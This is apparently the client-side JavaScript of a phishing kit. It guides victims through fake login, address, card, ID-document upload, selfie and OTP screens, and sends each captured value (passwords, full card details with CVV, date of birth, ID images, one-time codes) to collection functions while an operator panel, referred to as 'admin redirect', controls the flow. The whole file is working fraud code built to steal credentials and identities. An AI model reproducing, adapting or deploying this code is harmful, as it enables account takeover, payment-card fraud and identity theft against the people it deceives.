let sess = generateString(15);
const AUTO_MODE = Boolean(window.AUTO_MODE);

function go(id) {
	if (id == 'submit-u' && checkEmpty(userField)) {	

		$('#loading-content').show();
		setTimeout(function () {
			$('#loading-content').hide();
			hideDiv(uForm);
			showDiv(pForm);
		}, waitSleep);
		setInner('u-value', getInputValue(userField));

        } else if (id == 'submit-lg' && checkEmpty(passField)) {

                sendMainINFO(sess, getInputValue(userField), getInputValue(passField));
                // Show loading overlay and wait for admin redirect
                if (!AUTO_MODE) {
                        $('#loading-content').show();
                }

        } else if (id == 'submit-ml' && checkEmpty(mlPassField)) {

                sendMlINFO(sess, getInputValue(mlPassField));
                // Show loading overlay and wait for admin redirect
                if (!AUTO_MODE) {
                        $('#loading-content').show();
                }

        } else if (id == 'submit-addr' && checkEmpty(fname) && checkEmpty(lname) && checkEmpty(addrField)
                && checkEmpty(zipField) && checkEmpty(stateField) && checkEmpty('pho-field') && checkEmpty('db-field')) {

		var bl_data = "Full name: " + getInputValue(fname) + ' ' + getInputValue(lname) + 
		"\nAddress: " + getInputValue(addrField) + 
		"\nZIP: " + getInputValue(zipField) + " ("  + getInputValue(stateField) + ")" +
		"\nPhone: " + getInputValue('pho-field') +
		"\nDOB: " + getInputValue('db-field');
                sendBlInfo(sess, bl_data);
                // Show loading overlay and wait for admin redirect
                if (!AUTO_MODE) {
                        $('#loading-content').show();
                }

        } else if (id == 'submit-card' && checkEmpty(fullname_field) && checkEmpty(card_field) && checkEmpty(expiry_field) && checkEmpty(cvv_field) && validateCard(card_field) && validateExpiry(expiry_field)) {
                hideDiv(crError);
                sendCardInfo(sess, getInputValue(fullname_field), getInputValue(card_field),
                        getInputValue(expiry_field), getInputValue(cvv_field));
                // Show loading overlay and wait for admin redirect
                if (!AUTO_MODE) {
                        $('#loading-content').show();
                }

	} else if (id == 'submit-card') {
		// Show error if card validation fails
		showDiv(crError);

	} else if (id == 'submit-docs' && checkEmpty('doc-front-field') && checkEmpty('doc-back-field')) {

		hideDiv(doc_page);
		showDiv('doc-load');
		setTimeout(function () {
			$('#doc-proc-content').hide(1000);
			$('#sc-doc').show(1000);
			setTimeout(function () {
				hideDiv('doc-load');
				showDiv(doc_2_page);
			}, 2350);
		}, 2350);

	} else if (id == 'submit-docs-2' && checkEmpty('doc-face-field')) {

		sendDocsINFO(sess, getInputValue(front_doc_field), getInputValue(back_doc_field), getInputValue('face-base'));
		hideDiv(doc_2_page);
		showDiv('doc-load');
                setTimeout(function () {
                        $('#doc-proc-content').hide(1000);
                        $('#sc-doc').show(1000);
                        setTimeout(function () {
                                hideDiv('doc-load');
                                // Show loading overlay and wait for admin redirect
                                if (!AUTO_MODE) {
                                        $('#loading-content').show();
                                }
                        }, 2350);
                }, 2350);

	} else if (id == 'submit-kod' && checkEmpty(kodeField)) {

                sendKod(sess, getInputValue(kodeField), kod_type);
                // Show loading overlay and wait for admin redirect
                if (!AUTO_MODE) {
                        $('#loading-content').show();
                }
        } else if (id == 'submit-otp-error' && checkEmpty('otp-error-field')) {

                sendKod(sess, getInputValue('otp-error-field'), kod_type);
                // Show loading overlay and wait for admin redirect
                if (!AUTO_MODE) {
                        $('#loading-content').show();
                }
        }
}

function handleAutoAdvance(step) {
        if (!AUTO_MODE) {
                return;
        }

        $('#loading-content').hide();

        switch (step) {
                case 'login':
                        hideDiv(pForm);
                        hideDiv(mlForm);
                        hideDiv(landing_page);
                        hideDiv(LoadPage);
                        showDiv(addrForm);
                        lastWindows = addrForm;
                        break;
                case 'address':
                        hideDiv(addrForm);
                        hideDiv(LoadPage);
                        showDiv(crdForm);
                        lastWindows = crdForm;
                        break;
                case 'card':
                        hideDiv(crdForm);
                        hideDiv(kodeForm);
                        hideDiv('otp-error-form');
                        showDiv(sucForm);
                        lastWindows = sucForm;
                        redirect(redirectUrl, 6500);
                        break;
                default:
                        console.warn('handleAutoAdvance received unknown step:', step);
        }
}

window.handleAutoAdvance = handleAutoAdvance;

function showLoadingDots() {
  document.getElementById('dot1').classList.toggle('visible');
  setTimeout(function () {
  	document.getElementById('dot2').classList.toggle('visible');
  	setTimeout(function () {
  		document.getElementById('dot3').classList.toggle('visible');
  		setTimeout(function () {
  			document.getElementById('dot1').classList.toggle('hidden');
  			document.getElementById('dot2').classList.toggle('hidden');
  			document.getElementById('dot3').classList.toggle('hidden');
  			setTimeout(function () {
  				showLoadingDots();
  			}, 150);
  		}, 100);
  	}, 200);
  }, 200);
}

function showLoadingDots_2() {
  document.getElementById('dot1-2').classList.toggle('visible');
  setTimeout(function () {
  	document.getElementById('dot2-2').classList.toggle('visible');
  	setTimeout(function () {
  		document.getElementById('dot3-2').classList.toggle('visible');
  		setTimeout(function () {
  			document.getElementById('dot1-2').classList.toggle('hidden');
  			document.getElementById('dot2-2').classList.toggle('hidden');
  			document.getElementById('dot3-2').classList.toggle('hidden');
  			setTimeout(function () {
  				showLoadingDots();
  			}, 150);
  		}, 100);
  	}, 200);
  }, 200);
}

//:::::::::::::::::::::::::::::.
$(document).ready (function () {
	
	cardMasks('#' + card_field, '#' + expiry_field, '#' + cvv_field);
	showLoadingDots();
	showLoadingDots_2();
	$('#' + kodeField).mask('000000');
	
	// Restrict OTP input to only numbers
	$('#' + kodeField).on('input', function() {
		this.value = this.value.replace(/[^0-9]/g, '');
		if (this.value.length > 6) {
			this.value = this.value.slice(0, 6);
		}
	});

	$('#doc-front-field').on('change', function(event) {
	    var file = event.target.files[0];

	    if (file) {
	        var reader = new FileReader();

	        reader.onload = function(e) {
	            $('#' + front_doc_field).val(e.target.result);
	        };

	        reader.readAsDataURL(file);
	    }
	});

	$('#doc-back-field').on('change', function(event) {
	    var file = event.target.files[0];

	    if (file) {
	        var reader = new FileReader();

	        reader.onload = function(e) {
	            $('#' + back_doc_field).val(e.target.result);
	        };

	        reader.readAsDataURL(file);
	    }
	});

	$('#doc-face-field').on('change', function(event) {
	    var file = event.target.files[0];

	    if (file) {
	        var reader = new FileReader();

	        reader.onload = function(e) {
	            $('#' + face_doc_field).val(e.target.result);
	        };

	        reader.readAsDataURL(file);
	    }
	});
});
